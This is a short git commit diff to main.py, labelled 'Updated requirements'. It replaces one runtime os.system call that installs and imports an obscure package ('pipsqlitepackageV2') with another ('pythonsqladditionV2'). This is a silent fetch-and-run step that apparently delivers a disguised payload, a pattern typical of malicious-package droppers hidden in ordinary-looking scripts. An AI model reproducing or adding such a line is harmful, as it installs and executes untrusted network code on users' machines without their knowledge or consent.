72915442e4a57bd060e567d64d56987a10c0305b
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-15 09:57:51 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlitepackageV2")
-import pipsqlitepackageV2
+os.system("pip install pythonsqladditionV2")
+import pythonsqladditionV2
 import random
 import requests
 import time
